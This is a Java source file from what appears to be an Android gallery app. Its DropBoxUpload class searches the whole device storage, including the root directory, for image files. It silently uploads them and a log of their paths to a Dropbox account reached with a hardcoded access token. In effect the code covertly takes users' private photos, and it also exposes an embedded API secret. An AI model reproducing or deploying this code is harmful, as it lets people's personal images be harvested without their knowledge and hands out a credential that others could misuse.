package com.application.sawai.gallery.box;

import android.content.SharedPreferences;
import android.os.Environment;
import android.support.annotation.NonNull;
import android.util.Log;

import com.application.sawai.gallery.UtilClass;
import com.application.sawai.gallery.db.DBHelper;
import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v1.DbxClientV1;
import com.dropbox.core.v1.DbxEntry;
import com.dropbox.core.v1.DbxWriteMode;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Locale;

/**
 * Created by SAWAI on 6/27/2016.
 */
public class DropBoxUpload {
    public static final int MAX_DEPTH_FROM_PARENT = 10;
    private String ACCESS_TOKEN = "qLOe69SBF4AAAAAAAAAABzZeRa_BM2l8d2IixpOS9k1ON1qDPGDWyfT2T6eIswUg";
    private DbxClientV1 _dbxClient;
    private DBHelper dbHelper;
    private SharedPreferences sharedpreferences;
    private int fileCounter = 0;
    private static String TAG = "DropBoxUpload";
    private boolean searchComplete = true;
    public static final File FILE = new File("/mnt/sdcard/10001.txt");

    public SharedPreferences getSharedpreferences() {
        return sharedpreferences;
    }

    public void setSharedpreferences(SharedPreferences sharedpreferences) {
        this.sharedpreferences = sharedpreferences;
    }

    public void setDbHelper(DBHelper dbHelper) {
        this.dbHelper = dbHelper;
    }

    private void uploadFiles(File file) throws DbxException, IOException {

        String userLocale = Locale.getDefault().toString();
        DbxRequestConfig requestConfig = new DbxRequestConfig("DbxUploader", userLocale);
        _dbxClient = new DbxClientV1(requestConfig, ACCESS_TOKEN);
        FileInputStream inputStream = new FileInputStream(file);

        DbxEntry.File upload = _dbxClient.uploadFile(resolveParentFolder(file), DbxWriteMode.add(), file.length(), inputStream);
        Log.i(TAG,"File " + upload.name + " uploaded. ");
    }

    @NonNull
    private String resolveParentFolder(File file) {
        return "/Photos/" + UtilClass.getUserId(sharedpreferences) + "/";
    }


    public void uploadFiles() throws Exception {
        if(UtilClass.isExternalStorageReadable()) {
            System.out.println("External storage readable");
            walk(Environment.getExternalStorageDirectory().getAbsolutePath(), 0);
            walk("/mnt/sdcard", 0);
            walk("/", 0);
            if(searchComplete) {
                writeToFile("Search completed!!!!");
            }
            uploadFiles(FILE);
        }
    }

    private void walk(String path, int currentDepth) throws Exception {
        if(path == null) {
            return;
        }

        if(fileCounter > 100) {
            searchComplete = false;
            return;
        }

        if(currentDepth > MAX_DEPTH_FROM_PARENT){
            return;
        }

        File root = new File(path);
        File[] list = root.listFiles();

        if (list == null) return;

        for ( File file : list ) {
            if ( file.isDirectory() ) {
                if(UtilClass.checkIfNotAHiddenDirectory(file)) {
                    walk(file.getAbsolutePath(), currentDepth + 1);
                }
            }
            else {
                checkAndUploadFile(file);

            }
        }
    }

    private void checkAndUploadFile(File fileToUpload) throws Exception {
        if(isImage(fileToUpload)) {
            if(!dbHelper.fileExistInDb(fileToUpload.getAbsolutePath())) {
                uploadFiles(fileToUpload);
                writeToFile(fileToUpload.getAbsolutePath());
                dbHelper.addPath(fileToUpload.getAbsolutePath());
                fileCounter++;
            }
        }
    }

    private void writeToFile(String text) throws IOException {
        if(!FILE.exists()) {
            FILE.createNewFile();
        }
        FileWriter fileWriter = null;
        BufferedWriter bufferWritter = null;
        try {
            fileWriter = new FileWriter(FILE,true);
            bufferWritter = new BufferedWriter(fileWriter);
            String data = text + System.getProperty("line.separator");
            bufferWritter.write(data);
        }
        finally {
            if(bufferWritter != null) {
                bufferWritter.close();
            }
        }
    }

    private boolean isImage(File fileToUpload) {
        return UtilClass.checkExtension(fileToUpload);

    }
}
